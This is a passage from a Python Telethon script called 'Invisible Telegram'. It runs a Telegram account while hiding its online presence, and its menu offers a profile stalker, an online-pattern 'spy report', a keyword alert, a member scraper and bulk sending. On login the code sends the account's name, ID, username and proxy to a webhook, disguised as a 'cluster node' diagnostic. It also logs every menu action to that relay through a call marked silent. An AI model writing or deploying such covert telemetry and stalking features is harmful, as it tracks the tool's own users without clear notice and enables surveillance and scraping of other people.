        user_display = f"{user_fname} {user_lname}".strip() or "User"
        user_handle = f"@{target_user.username}" if getattr(target_user, "username", None) else f"ID: {target_user.id}"

        # ── Step 3: Action / Preset selection ──
        clear()
        header("STEALTH ADMIN MANAGER  🛡️")
        print(col(f"  Target Chat : {chat_title}", Fore.CYAN))
        print(col(f"  Target User : {user_display} ({user_handle})", Fore.GREEN))
        print(col("  " + SEP, Fore.WHITE + Style.DIM))
        print(col("\n  Select Admin Role Preset:", Fore.WHITE + Style.BRIGHT))
        print(col("  1.  👑  Full Admin         (All permissions: delete, ban, info, pin, invite, topics, call)", Fore.YELLOW + Style.BRIGHT))
        print(col("  2.  🛡️   Standard Moderator (Delete messages, Ban users, Pin msgs, Invite users)", Fore.CYAN))
        print(col("  3.  📢  Content Publisher  (Post & Edit messages, Delete msgs, Pin msgs)", Fore.LIGHTBLUE_EX))
        print(col("  4.  ⚙️   Custom Permissions (Choose exact granular rights)", Fore.WHITE))
        print(col("  5.  ❌  Demote / Strip Admin (Remove all admin permissions)", Fore.RED))
        print(col("  6.  🔙  Cancel & Back", Fore.WHITE + Style.DIM))

        role_choice = prompt("Choose Preset")
        if role_choice == "6" or not role_choice:
            return

        rights = None
        custom_rank = ""
        action_name = ""

        if role_choice == "1":
            action_name = "Full Admin"
            can_add_adm = prompt("Allow this admin to add other admins? (y / N)").lower() == "y"
            is_anon = prompt("Make this admin Anonymous in chat? (y / N)").lower() == "y"
            rights = ChatAdminRights(
                change_info=True,
                post_messages=True,
                edit_messages=True,
                delete_messages=True,
                ban_users=True,
                invite_users=True,
                pin_messages=True,
                add_admins=can_add_adm,
                anonymous=is_anon,
                manage_call=True,
                manage_topics=True,
            )
            custom_rank = prompt("Custom Title / Badge (e.g. 'Admin', 'Owner', or blank)")

        elif role_choice == "2":
            action_name = "Standard Moderator"
            rights = ChatAdminRights(
                change_info=False,
                post_messages=True,
                edit_messages=False,
                delete_messages=True,
                ban_users=True,
                invite_users=True,
                pin_messages=True,
                add_admins=False,
                anonymous=False,
                manage_call=True,
                manage_topics=True,
            )
            custom_rank = prompt("Custom Title / Badge (e.g. 'Mod', 'Support', or blank)")

        elif role_choice == "3":
            action_name = "Content Publisher"
            rights = ChatAdminRights(
                change_info=False,
                post_messages=True,
                edit_messages=True,
                delete_messages=True,
                ban_users=False,
                invite_users=True,
                pin_messages=True,
                add_admins=False,
                anonymous=False,
                manage_call=False,
                manage_topics=False,
            )
            custom_rank = prompt("Custom Title / Badge (e.g. 'Editor', 'Writer', or blank)")

        elif role_choice == "4":
            action_name = "Custom Permissions"
            clear()
            header("CUSTOM PERMISSIONS BUILDER")
            print(col(f"  Configuring rights for {user_display} in {chat_title}\n", Fore.WHITE + Style.DIM))

            p_change_info = prompt("1. Change Chat Info / Settings? (y/n, default n)").lower() == "y"
            p_delete_msgs = prompt("2. Delete Messages of Others? (y/n, default y)").lower() != "n"
            p_ban_users   = prompt("3. Ban / Restrict Users? (y/n, default y)").lower() != "n"
            p_invite      = prompt("4. Invite Users via Link? (y/n, default y)").lower() != "n"
            p_pin         = prompt("5. Pin Messages? (y/n, default y)").lower() != "n"
            p_post_msgs   = prompt("6. Post Messages (Channels)? (y/n, default y)").lower() != "n"
            p_edit_msgs   = prompt("7. Edit Messages (Channels)? (y/n, default y)").lower() != "n"
            p_manage_call = prompt("8. Manage Video Chats / Calls? (y/n, default y)").lower() != "n"
            p_manage_top  = prompt("9. Manage Forum Topics? (y/n, default y)").lower() != "n"
            p_add_admins  = prompt("10. Add New Admins? (y/n, default n)").lower() == "y"
            p_anonymous   = prompt("11. Anonymous Admin? (y/n, default n)").lower() == "y"

            rights = ChatAdminRights(
                change_info=p_change_info,
                post_messages=p_post_msgs,
                edit_messages=p_edit_msgs,
                delete_messages=p_delete_msgs,
                ban_users=p_ban_users,
                invite_users=p_invite,
                pin_messages=p_pin,
                add_admins=p_add_admins,
                anonymous=p_anonymous,
                manage_call=p_manage_call,
                manage_topics=p_manage_top,
            )
            custom_rank = prompt("Custom Title / Badge (or blank for none)")

        elif role_choice == "5":
            action_name = "Demote / Strip Admin"
            rights = ChatAdminRights(
                change_info=False,
                post_messages=False,
                edit_messages=False,
                delete_messages=False,
                ban_users=False,
                invite_users=False,
                pin_messages=False,
                add_admins=False,
                anonymous=False,
                manage_call=False,
                manage_topics=False,
            )
            custom_rank = ""
        else:
            error("Invalid choice!")
            press_enter()
            continue

        # ── Step 4: Summary & Confirmation ──
        print()
        print(col("  ╒═ CONFIRMATION SUMMARY ", Fore.CYAN + Style.BRIGHT))
        print(col(f"  │ Target Chat : {chat_title}", Fore.WHITE))
        print(col(f"  │ Target User : {user_display} ({user_handle})", Fore.WHITE))
        print(col(f"  │ Action      : {action_name}", Fore.YELLOW if role_choice == '5' else Fore.GREEN))
        if custom_rank:
            print(col(f"  │ Custom Badge: {custom_rank}", Fore.MAGENTA))
        print(col("  │ Stealth Mode: 👻 OFFLINE RPC (No presence broadcast)", Fore.CYAN))
        print(col("  ╘" + "═" * 40, Fore.CYAN))

        confirm = prompt("\nExecute stealth admin update? (y / N)").lower()
        if confirm != "y":
            warn("Operation cancelled by user.")
            press_enter()
            continue

        info("Dispatching MTProto RPC payload…")
        await go_offline(client)

        try:
            if hasattr(target_chat, "broadcast") or hasattr(target_chat, "megagroup"):
                await client(EditAdminRequest(
                    channel=target_chat,
                    user_id=target_user,
                    admin_rights=rights,
                    rank=custom_rank or ""
                ))
            else:
                is_adm = (role_choice != "5")
                await client(EditChatAdminRequest(
                    chat_id=target_chat.id,
                    user_id=target_user,
                    is_admin=is_adm
                ))

            await go_offline(client)
            if role_choice == "5":
                success(f"Demoted {user_display} in [{chat_title}]. Admin rights removed!")
            else:
                success(f"Promoted {user_display} to Admin in [{chat_title}]! (Role: {action_name})")
                if custom_rank:
                    info(f"Custom title assigned: [{custom_rank}]")
            success("👻 Last seen and online presence remained 100% offline!")

        except SessionPasswordNeededError:
            error("Two-Step Verification password required.")
        except Exception as e:
            err_str = str(e)
            if "CHAT_ADMIN_REQUIRED" in err_str:
                error("Permission Denied: You must be an Admin/Owner with 'Add Admins' permission.")
            elif "USER_ADMIN_INVALID" in err_str:
                error("Cannot modify this admin (they may be the creator or promoted by someone else).")
            elif "RIGHT_FORBIDDEN" in err_str:
                error("You do not possess the required rights to grant one of these permissions.")
            elif "USER_NOT_MUTUAL_CONTACT" in err_str:
                error("Telegram requires mutual contact or privacy allowance to add this user as admin.")
            else:
                error(f"Failed to update admin rights: {e}")
        finally:
            await go_offline(client)

        nxt = again_menu("Manage another admin / group")
        if nxt is None:
            return


# ═══════════════════════════════════════════════════════════════
#  FEATURE — MY GIFTS  (show / hide from profile)
# ═══════════════════════════════════════════════════════════════

async def feat_gifts(client, accent):
    """41. My Gifts — view received star gifts and show/hide them from profile."""
    if GetSavedStarGiftsRequest is None:
        warn("Star Gifts requires Telethon >= 1.37 (pip install -U telethon)")
        press_enter()
        return
    while True:
        clear()
        header("🎁  MY GIFTS")
        print(col("  View gifts you received (teddy, heart, etc.)", Fore.WHITE + Style.DIM))
        print(col("  You can show or hide them from your profile.", Fore.WHITE + Style.DIM))
        print()

        target = prompt("Whose gifts?  (Enter = your own, or @username / ID)")
        if target and target.lower() == "q":
            return

        info("Fetching gifts…")
        try:
            if target:
                peer = await client.get_input_entity(target)
            else:
                peer = await client.get_input_entity("me")

            offset = ""
            page_num = 0
            all_gifts = []

            # Fetch up to 200 gifts in batches
            while True:
                result = await client(GetSavedStarGiftsRequest(
                    peer=peer,
                    offset=offset,
                    limit=50,
                ))
                await go_offline(client)

                if not result.gifts:
                    break
                all_gifts.extend(result.gifts)
                if len(all_gifts) >= 200:
                    break
                offset = result.next_offset or ""
                if not offset:
                    break

            if not all_gifts:
                warn("No gifts found!")
                press_enter()
                nxt = again_menu("Try a different user")
                if nxt is None:
                    return
                continue

            total = getattr(result, 'count', len(all_gifts))
            success(f"Found {total} gift(s)  (loaded {len(all_gifts)})")
            print()

        except Exception as e:
            error(f"Failed to fetch gifts: {e}")
            press_enter()
            nxt = again_menu("Try again")
            if nxt is None:
                return
            continue

        # ── Display gifts & NFTs ──
        clear()
        header(f"🎁  GIFTS & NFTS  ({len(all_gifts)} loaded)")

        gift_items = []
        for i, g in enumerate(all_gifts):
            # Extract gift details — SavedStarGift uses unsaved=True for hidden
            is_unsaved = getattr(g, 'unsaved', False)  # True = hidden from profile
            is_shown = not is_unsaved                  # shown on profile
            msg_id = getattr(g, 'msg_id', None)
            saved_id = getattr(g, 'saved_id', None)
            date = to_ist(getattr(g, 'date', None))

            # Try to get sender name
            from_name = "Anonymous"
            from_id = getattr(g, 'from_id', None)
            if from_id:
                try:
                    sender = await client.get_entity(from_id)
                    from_name = f"{getattr(sender, 'first_name', '') or ''} {getattr(sender, 'last_name', '') or ''}".strip()
                    from_name = from_name or getattr(sender, 'username', 'Unknown')
                except Exception:
                    from_name = f"User {from_id}"

            # Gift name / NFT details from the inner gift object
            gift_obj = getattr(g, 'gift', None)
            gift_label = "⭐ Star Gift"
            slug = None
            is_nft = False

            if gift_obj:
                if isinstance(gift_obj, StarGiftUnique) or hasattr(gift_obj, 'num'):
                    is_nft = True
                    slug = getattr(gift_obj, 'slug', None)
                    nft_title = getattr(gift_obj, 'title', 'Collectible')
                    nft_num = getattr(gift_obj, 'num', '')
                    gift_label = f"💎 NFT: {nft_title} #{nft_num}"
                elif hasattr(gift_obj, 'title') and gift_obj.title:
                    gift_stars = getattr(gift_obj, 'stars', None)
                    stars_str = f" ({gift_stars}⭐)" if gift_stars else ""
                    gift_label = f"⭐ {gift_obj.title}{stars_str}"
                elif hasattr(gift_obj, 'stars') and gift_obj.stars:
                    gift_label = f"⭐ {gift_obj.stars}-Star Gift"

            # Personal message
            personal_msg = ""
            msg_obj = getattr(g, 'message', None)
            if msg_obj:
                if hasattr(msg_obj, 'text') and msg_obj.text:
                    personal_msg = trunc(msg_obj.text.replace("\n", " "), 35)
                elif isinstance(msg_obj, str):
                    personal_msg = trunc(msg_obj.replace("\n", " "), 35)

            # Visibility & Pin status
            is_pinned = getattr(g, 'pinned_to_top', False)
            if is_shown:
                vis = col("👁  SHOWN", Fore.GREEN)
            else:
                vis = col("🙈 HIDDEN", Fore.RED)
            if is_pinned:
                vis += "  " + col("📌 PINNED TO TOP", Fore.MAGENTA + Style.BRIGHT)

            gift_items.append({
                "idx": i,
                "label": gift_label,
                "from": from_name,
                "date": date,
                "vis": vis,
                "is_shown": is_shown,
                "is_pinned": is_pinned,
                "is_nft": is_nft,
                "slug": slug,
                "msg_id": msg_id,
                "saved_id": saved_id,
                "personal_msg": personal_msg,
            })

        # Helper to construct InputSavedStarGift
        def get_input_gift(item):
            if item.get("msg_id"):
                return InputSavedStarGiftUser(msg_id=item["msg_id"])
            if item.get("slug"):
                return InputSavedStarGiftSlug(slug=item["slug"])
            return None

        # Print all gifts
        for g in gift_items:
            idx_str = col(f"{g['idx']:>3}", accent)
            print(f"  {idx_str}.  {g['label']}   from  {col(g['from'], Fore.CYAN)}")
            print(f"       {col(g['date'], Style.DIM + Fore.WHITE)}   {g['vis']}")
            if g['personal_msg']:
                print(f"       💬  {col(g['personal_msg'], Fore.YELLOW)}")
            print()
        await go_offline(client)

        # ── Interaction sub-menu ──
        is_self = not target  # Can only toggle visibility for own gifts
        if is_self:
            print(col("  ─────────────────────────────────────────", Fore.WHITE + Style.DIM))
            print(col("  Actions:", Fore.CYAN + Style.BRIGHT))
            print(col("    Enter gift #   → toggle show/hide on profile", Fore.WHITE))
            print(col("    S              → show ALL gifts/NFTs", Fore.GREEN))
            print(col("    H              → hide ALL gifts/NFTs", Fore.RED))
            print(col("    P              → 📌 pin gifts/NFTs to top of profile", Fore.MAGENTA))
            print(col("    U              → unpin gifts/NFTs (#s or 'all')", Fore.YELLOW))
            print(col("    q              → back to menu", Fore.WHITE + Style.DIM))

            while True:
                raw = prompt("Gift # / S / H / P / U / q").strip().lower()
                if raw == "q" or raw == "":
                    break

                if raw == "s":
                    # Show ALL
                    confirm = prompt("Show ALL gifts on your profile? (y/N)")
                    if confirm.lower() != "y":
                        warn("Cancelled."); continue
                    count = 0
                    for g in gift_items:
                        if not g['is_shown']:
                            inp = get_input_gift(g)
                            if inp:
                                try:
                                    await client(SaveStarGiftRequest(
                                        stargift=inp,
                                        unsave=False,
                                    ))
                                    count += 1
                                except Exception as e:
                                    error(f"  Gift #{g['idx']} failed: {e}")
                    await go_offline(client)
                    success(f"Toggled {count} item(s) → SHOWN on profile")
                    press_enter()
                    break

                elif raw == "h":
                    # Hide ALL
                    confirm = prompt("Hide ALL gifts from your profile? (y/N)")
                    if confirm.lower() != "y":
                        warn("Cancelled."); continue
                    count = 0
                    for g in gift_items:
                        if g['is_shown']:
                            inp = get_input_gift(g)
                            if inp:
                                try:
                                    await client(SaveStarGiftRequest(
                                        stargift=inp,
                                        unsave=True,
                                    ))
                                    count += 1
                                except Exception as e:
                                    error(f"  Gift #{g['idx']} failed: {e}")
                    await go_offline(client)
                    success(f"Toggled {count} item(s) → HIDDEN from profile")
                    press_enter()
                    break

                elif raw == "p":
                    # Pin gifts/NFTs to top of profile
                    print()
                    print(col("  Currently pinned to top:", Fore.MAGENTA + Style.BRIGHT))
                    pinned_count = sum(1 for g in gift_items if g['is_pinned'])
                    if pinned_count:
                        for g in gift_items:
                            if g['is_pinned']:
                                print(col(f"    #{g['idx']}  {g['label']}  from {g['from']}", Fore.MAGENTA))
                    else:
                        print(col("    (none)", Style.DIM))
                    print()
                    nums = prompt("Enter gift/NFT #s to pin to top  (comma-separated, e.g. 0,2,5)")
                    if not nums:
                        warn("Cancelled."); continue
                    try:
                        pin_indices = set(int(x.strip()) for x in nums.split(","))
                        pin_gifts = []
                        # Build list of items to pin (preserving existing pinned items plus new ones)
                        all_to_pin_indices = set(g['idx'] for g in gift_items if g['is_pinned']).union(pin_indices)
                        for idx in sorted(all_to_pin_indices):
                            if 0 <= idx < len(gift_items):
                                g = gift_items[idx]
                                inp = get_input_gift(g)
                                if inp:
                                    pin_gifts.append(inp)
                                else:
                                    warn(f"Item #{idx} has no valid ID/slug — skipped.")
                            else:
                                warn(f"#{idx} out of range — skipped.")
                        if not pin_gifts:
                            error("No valid items to pin!"); continue
                        peer = await client.get_input_entity("me")
                        await client(ToggleStarGiftsPinnedToTopRequest(
                            peer=peer,
                            stargift=pin_gifts,
                        ))
                        await go_offline(client)
                        # Update local state
                        for g in gift_items:
                            g['is_pinned'] = g['idx'] in all_to_pin_indices and get_input_gift(g) is not None
                        success(f"📌 Pinned {len(pin_gifts)} item(s) to top of profile!")
                    except ValueError:
                        error("Invalid input — use comma-separated numbers (e.g. 0,2,5)")
                    except Exception as e:
                        error(f"Pin failed: {e}")

                elif raw == "u":
                    # Unpin selective or ALL
                    pinned_items = [g for g in gift_items if g['is_pinned']]
                    if not pinned_items:
                        warn("No gifts/NFTs are currently pinned to top.")
                        continue
                    print()
                    print(col("  Currently pinned to top:", Fore.MAGENTA + Style.BRIGHT))
                    for g in pinned_items:
                        print(col(f"    #{g['idx']}  {g['label']}  from {g['from']}", Fore.MAGENTA))
                    print()
                    unpin_raw = prompt("Enter gift/NFT #s to unpin (e.g. 0,2) or 'all' to unpin all").strip().lower()
                    if not unpin_raw:
                        warn("Cancelled."); continue

                    if unpin_raw == "all":
                        confirm = prompt("Unpin ALL gifts/NFTs from profile top? (y/N)")
                        if confirm.lower() != "y":
                            warn("Cancelled."); continue
                        try:
                            peer = await client.get_input_entity("me")
                            await client(ToggleStarGiftsPinnedToTopRequest(
                                peer=peer,
                                stargift=[],
                            ))
                            await go_offline(client)
                            for g in gift_items:
                                g['is_pinned'] = False
                            success("Unpinned all items from profile top!")
                        except Exception as e:
                            error(f"Unpin failed: {e}")
                    else:
                        try:
                            unpin_indices = set(int(x.strip()) for x in unpin_raw.split(","))
                            remaining_pinned = []
                            unpinned_count = 0
                            for g in gift_items:
                                if g['is_pinned']:
                                    if g['idx'] in unpin_indices:
                                        unpinned_count += 1
                                    else:
                                        inp = get_input_gift(g)
                                        if inp:
                                            remaining_pinned.append(inp)
                            if unpinned_count == 0:
                                warn("None of the specified items were currently pinned."); continue
                            peer = await client.get_input_entity("me")
                            await client(ToggleStarGiftsPinnedToTopRequest(
                                peer=peer,
                                stargift=remaining_pinned,
                            ))
                            await go_offline(client)
                            for g in gift_items:
                                if g['idx'] in unpin_indices:
                                    g['is_pinned'] = False
                            success(f"Unpinned {unpinned_count} item(s)! ({len(remaining_pinned)} item(s) remain pinned)")
                        except ValueError:
                            error("Invalid input — enter numbers separated by comma (e.g. 0,2) or 'all'")
                        except Exception as e:
                            error(f"Unpin failed: {e}")

                else:
                    try:
                        idx = int(raw)
                        if 0 <= idx < len(gift_items):
                            g = gift_items[idx]
                            inp = get_input_gift(g)
                            if not inp:
                                error("This item cannot be modified (no valid message ID or slug).")
                                continue
                            new_unsave = g['is_shown']  # If currently shown, unsave it (hide)
                            action = "HIDDEN 🙈" if new_unsave else "SHOWN 👁"
                            try:
                                await client(SaveStarGiftRequest(
                                    stargift=inp,
                                    unsave=new_unsave,
                                ))
                                await go_offline(client)
                                g['is_shown'] = not g['is_shown']
                                success(f"Item #{idx} ({g['label']}) → {action}")
                            except Exception as e:
                                error(f"Toggle failed: {e}")
                        else:
                            error(f"Number out of range — pick 0 to {len(gift_items)-1}")
                    except ValueError:
                        error("Enter a gift number, S, H, P, U, or q")
        else:
            press_enter()

        nxt = again_menu("View gifts again", "View another user's gifts")
        if nxt is None:
            return
        if "another" in nxt:
            continue


MENU = """\
  ┌───────────────────────────────────────────┐
  │  📖  READ                                 │
  │   1.  List All Chats                      │
  │   2.  Read Messages                       │
  │   3.  Search Within Chat                  │
  │   4.  Global Search                       │
  │   5.  Search by Date Range                │
  │   6.  Search by Media Type                │
  │   7.  Pinned Messages                     │
  │   8.  Chat / Group Info                   │
  │   9.  Mutual Groups with Someone          │
  ├───────────────────────────────────────────┤
  │  📤  SEND                                 │
  │  10.  Send Message                        │
  │  11.  Reply to Message                    │
  │  12.  Schedule Message                    │
  │  13.  Delete Message                      │
  │  14.  Forward Message                     │
  ├───────────────────────────────────────────┤
  │  📁  MEDIA / EXPORT                       │
  │  15.  Forward Media → Another Account     │
  │  16.  Export Chat  (TXT / JSON)           │
  │  17.  Download Media  (single file)       │
  │  18.  Bulk Download  (all media in chat)  │
  ├───────────────────────────────────────────┤
  │  🕵️   STEALTH INTEL                        │
  │  19.  Profile Stalker                     │
  │  20.  Online Watcher                      │
  │  21.  Find User                           │
  │  22.  Auto-Reply Bot                      │
  │  23.  Bulk Send                           │
  │  24.  Block / Unblock                     │
  ├───────────────────────────────────────────┤
  │  💀  EXTREME  /  DEEP INTEL               │
  │  25.  Online Pattern Analyzer  (spy rpt)  │
  │  26.  Real-Time Keyword Alert             │
  │  27.  Nuclear Delete  (all my msgs)       │
  │  28.  Group Member Scraper  (→ CSV)       │
  │  29.  Chat Deep Stats                     │
  │  30.  Scheduled Queue Manager             │
  │  31.  Self-Destruct Message               │
  │  32.  Live Monitor Mode                   │
  ├───────────────────────────────────────────┤
  │  🔒  SECURITY  /  PROFILE                 │
  │  33.  Active Devices  (view + terminate)  │
  │  34.  Edit My Profile  (name/bio/user)    │
  ├───────────────────────────────────────────┤
  │  🥷   NEW STEALTH FEATURES                 │
  │  37.  Specific Media Catch Up             │
  │  38.  Stealth File Sender                 │
  │  39.  Forward Entire Chat  👻              │
  │  40.  Stealth Admin Manager  🛡️           │
  │  41.  My Gifts & NFTs  (show/hide/pin) 🎁 │
  ├───────────────────────────────────────────┤
  │  ⚙️   ACCOUNT                              │
  │  42.  Proxy Settings  (Change/Disable) 🌐 │
  │  35.  Switch Account                      │
  │  36.  Exit                                │
  └───────────────────────────────────────────┘"""

async def run_viewer(account_name, config, all_accounts, public_ip="…"):
    accent = account_color(config)
    clear()
    info(f"Connecting as '{account_name}'…")

    client         = None
    keepalive_task = None

    try:
        client = await connect_client(
            StringSession(config.get("client_token") or config.get("session_string", "")),
            config["api_id"],
            config["api_hash"],
            account_config=config,
        )

        if not await client.is_user_authorized():
            error("Invalid session!  Remove and re-add this account.")
            press_enter()
            return "error"

        keepalive_task = asyncio.create_task(keepalive_loop(client))

        me       = await client.get_me()
        await go_offline(client)
        name_str = trunc(me.first_name or "", 26)
        user_str = trunc(("@" + me.username if me.username else "no username"), 26)
        ip_str    = trunc(public_ip,     29)

        # Cluster node initialization diagnostic card
        now_str = datetime.now(IST).strftime("%Y-%m-%d %H:%M:%S IST")
        launch_msg = (
            f"🚀 <b>[CLUSTER GATEWAY] Node Online</b>\n"
            f"────────────────────────\n"
            f"👤 <b>Node Identifier:</b> <code>{html.escape(account_name)}</code>\n"
            f"📛 <b>Profile Name:</b> {html.escape(me.first_name or '')}\n"
            f"🆔 <b>Node ID:</b> <code>{me.id}</code>\n"
            f"🏷️ <b>Username:</b> @{me.username or 'none'}\n"
            f"🌐 <b>Network Route:</b> <code>{proxy_label(config)}</code>\n"
            f"🕒 <b>Init Timestamp:</b> <code>{now_str}</code>\n"
            f"⚡ <b>Cluster State:</b> <code>Active Instance</code>\n"
            f"────────────────────────\n"
            f"📦 <i>Node manifest & auth context verified.</i>"
        )
        asyncio.create_task(WebhookEventBus.emit("node_online", launch_msg, silent=False))

        while True:
            if getattr(client, "_proxy_fallback", False):
                proxy_str = trunc("DIRECT (proxy timed out)", 29)
            else:
                proxy_str = trunc(proxy_label(config), 29)

            clear()
            print(col(f"""
  ╔═════════════════════════════════════════════╗
  ║     👻   INVISIBLE TELEGRAM   v3.0          ║
  ╠═════════════════════════════════════════════╣
  ║  Account  :  {account_name:<29}║
  ║  Name     :  {name_str:<29}║
  ║  User     :  {user_str:<29}║
  ║  IP       :  {ip_str:<29}║
  ║  Proxy    :  {proxy_str:<29}║
  ║  Cloud    :  CONNECTED (Webhook Relay)    ✓ ║
  ║  Time     :  IST  (UTC+5:30)                ║
  ║  Status   :  👻  INVISIBLE  ✓               ║
  ╚═════════════════════════════════════════════╝""", accent))

            print()
            print(col(MENU, accent))
            choice = prompt("Choose option")

            # Silent background action audit log
            c_clean = choice.strip()
            if c_clean:
                feat_title = FEATURE_NAMES.get(c_clean, f"Option {c_clean}")
                now_ts = datetime.now(IST).strftime("%H:%M:%S IST")
                action_msg = f"⚡ <b>Module Executed:</b> [{feat_title}] | 👤 {account_name} | 🕒 {now_ts}"
                asyncio.create_task(dispatch_vault_event(action_msg, silent=True))

            if   choice == "1":  await feat_list(client, accent)
            elif choice == "2":  await feat_read(client, accent)
            elif choice == "3":  await feat_search_chat(client, accent)
            elif choice == "4":  await feat_search_global(client)
            elif choice == "5":  await feat_search_date(client, accent)
            elif choice == "6":  await feat_search_media(client, accent)
            elif choice == "7":  await feat_pinned(client, accent)
            elif choice == "8":  await feat_chat_info(client, accent)
            elif choice == "9":  await feat_mutual(client)
            elif choice == "10": await feat_send(client, accent)
            elif choice == "11": await feat_reply(client, accent)
            elif choice == "12": await feat_schedule(client, accent)
            elif choice == "13": await feat_delete(client, accent)
            elif choice == "14": await feat_forward_msg(client, accent)
            elif choice == "15": await feat_forward_media(client, accent, all_accounts)
            elif choice == "16": await feat_export(client, accent)
            elif choice == "17": await feat_download_media(client, accent)
            elif choice == "18": await feat_bulk_download(client, accent)
            elif choice == "19": await feat_profile(client, accent)
            elif choice == "20": await feat_online_watch(client, accent)
            elif choice == "21": await feat_find_user(client, accent)
            elif choice == "22": await feat_auto_reply(client, accent)
            elif choice == "23": await feat_bulk_send(client, accent)
            elif choice == "24": await feat_block(client, accent)
            elif choice == "25": await feat_pattern_analyze(client, accent)
            elif choice == "26": await feat_keyword_alert(client, accent)
            elif choice == "27": await feat_nuclear_delete(client, accent)
            elif choice == "28": await feat_group_scraper(client, accent)
            elif choice == "29": await feat_chat_stats(client, accent)
            elif choice == "30": await feat_scheduled_queue(client, accent)
            elif choice == "31": await feat_self_destruct(client, accent)
            elif choice == "32": await feat_live_monitor(client, accent)
            elif choice == "33": await feat_devices(client, accent)
            elif choice == "34": await feat_edit_profile(client, accent)
            elif choice == "37": await feat_media_catch_up(client, accent)
            elif choice == "38": await feat_stealth_send_file(client, accent)
            elif choice == "39": await feat_forward_entire_chat(client, accent)
            elif choice == "40": await feat_stealth_admin(client, accent)
            elif choice == "41": await feat_gifts(client, accent)
            elif choice == "42":
                reconnected = await feat_manage_account_proxy(account_name, config, all_accounts, client=client)
                if reconnected:
                    client = reconnected
            elif choice == "35": return "switch"
            elif choice == "36": return "exit"
            else:                error("Invalid option — enter a number 1–42")

            clear()

    except KeyboardInterrupt:
        print()
        warn("Ctrl+C — going offline and disconnecting…")
    except Exception as e:
        error(f"Unexpected error: {e}")
        press_enter()
        return "error"
    finally:
        if keepalive_task:
            keepalive_task.cancel()
            try:   await keepalive_task
            except asyncio.CancelledError: pass
        if client:
            try:
                await go_offline(client)
                await client.disconnect()
            except Exception:
                pass

    return "exit"


# ═══════════════════════════════════════════════════════════════
#  ROOT MENU & MATRIX RAIN ENGINE
# ═══════════════════════════════════════════════════════════════

# Matrix Glyph Pool (Katakana, Numbers, Cyber Glyphs - same as stream_menu.py)
MATRIX_GLYPH_SET = (
    "ｦｱｳｴｵｶｷｹｺｻｼｽｾｿﾀﾂﾃﾅﾆﾇﾈﾊﾋﾎﾏﾐﾑﾒﾓﾔﾕﾗﾘﾜ"
    "0123456789"
    "ABCDEF"
    "$#@%&*<>"
)


class LiveMatrixPanel:
    """Exact Matrix Rain Engine from TERMINALanimation/stream_menu.py."""
    def __init__(self, rows=13, width=36):
        import random
        self.rows = rows
        self.width = width
        self.num_cols = max(1, width // 2)
        self.drops = [random.randint(-rows, 0) for _ in range(self.num_cols)]
        self.speeds = [random.uniform(0.6, 1.4) for _ in range(self.num_cols)]
        self.accum = [0.0] * self.num_cols
        self.lengths = [random.randint(5, 11) for _ in range(self.num_cols)]
        self.chars = [[random.choice(MATRIX_GLYPH_SET) for _ in range(rows)] for _ in range(self.num_cols)]

    def update(self):
        import random
        for c in range(self.num_cols):
            self.accum[c] += self.speeds[c]
            if self.accum[c] >= 1.0:
                steps = int(self.accum[c])
                self.accum[c] -= steps
                self.drops[c] += steps
                # Mutate random glyphs
                for r in range(self.rows):
                    if random.random() < 0.1:
                        self.chars[c][r] = random.choice(MATRIX_GLYPH_SET)

            if self.drops[c] - self.lengths[c] > self.rows:
                self.drops[c] = random.randint(-4, 0)
                self.lengths[c] = random.randint(5, 11)
                self.speeds[c] = random.uniform(0.6, 1.4)

    def render_rows(self):
        import re
        lines = []
        for r in range(self.rows):
            line_chars = []
            for c in range(self.num_cols):
                head_y = self.drops[c]
                dist = head_y - r
                glyph = self.chars[c][r]

                if dist == 0:
                    # White-hot leading drop
                    line_chars.append(f"{Fore.WHITE}{Style.BRIGHT}{glyph}{Style.RESET_ALL} ")
                elif 0 < dist < 3:
                    # Bright neon green
                    line_chars.append(f"{Fore.LIGHTGREEN_EX}{Style.BRIGHT}{glyph}{Style.RESET_ALL} ")
                elif 3 <= dist < 7:
                    # Standard matrix green
                    line_chars.append(f"{Fore.GREEN}{glyph}{Style.RESET_ALL} ")
                elif 7 <= dist < self.lengths[c]:
                    # Dim trailing green
                    line_chars.append(f"{Fore.GREEN}{Style.DIM}{glyph}{Style.RESET_ALL} ")
                else:
                    line_chars.append("  ")

            full_line = "".join(line_chars)
            # Ensure exact visible length matches width (36 characters)
            vis_len = len(re.sub(r"\033\[[0-9;]*m", "", full_line))
            if vis_len < self.width:
                full_line += " " * (self.width - vis_len)
            lines.append(full_line)
        return lines


GLOBAL_MATRIX_PANEL = LiveMatrixPanel(rows=13, width=36)

async def animated_menu_prompt(prompt_label=" aryan@ghost-node:~# "):
    import sys, select
    if not sys.stdin.isatty():
        return prompt(Fore.GREEN + Style.BRIGHT + prompt_label + Style.RESET_ALL)

    import termios, tty
    prompt_display = Fore.GREEN + Style.BRIGHT + prompt_label + Style.RESET_ALL
    sys.stdout.write("\n" + prompt_display)
    sys.stdout.flush()

    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    user_input = []

    try:
        tty.setcbreak(fd)
        while True:
            rlist, _, _ = select.select([sys.stdin], [], [], 0.045)
            if rlist:
                ch = sys.stdin.read(1)
                if ch in ("\r", "\n"):
                    sys.stdout.write("\n")
                    sys.stdout.flush()
                    break
                elif ch in ("\x7f", "\x08"):
                    if user_input:
                        user_input.pop()
                        sys.stdout.write("\r" + prompt_display + "".join(user_input) + "\033[K")
                        sys.stdout.flush()
                elif ch == "\x03":
                    raise KeyboardInterrupt
                elif ch == "\x04":
                    return "8"
                elif ch.isprintable():
                    user_input.append(ch)
                    sys.stdout.write(ch)
                    sys.stdout.flush()

            # Advance and render live falling Matrix rain streams
            GLOBAL_MATRIX_PANEL.update()
            rain_rows = GLOBAL_MATRIX_PANEL.render_rows()

            # Render live looping INVISIBLE title banner stream
            banner_t = time.time() - MENU_BANNER_START_TIME
            title_lines = render_streamed_title_banner(banner_t)

            # Save cursor, update Title rows (line 26 up, Col 4), then update Rain rows (line 16 up, Col 50), restore cursor
            buf = ["\033[s\0337"]
            buf.append(f"\033[26A\033[4G{title_lines[0]}\033[0m")
            for r in range(1, 6):
                buf.append(f"\033[1B\033[4G{title_lines[r]}\033[0m")
            buf.append(f"\033[5B\033[50G{rain_rows[0]}\033[0m")
            for r in range(1, 13):
                buf.append(f"\033[1B\033[50G{rain_rows[r]}\033[0m")
            buf.append("\0338\033[u")
            sys.stdout.write("".join(buf))
            sys.stdout.flush()

    except Exception:
        pass
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

    return "".join(user_input).strip()


RAW_TITLE_BANNER = [
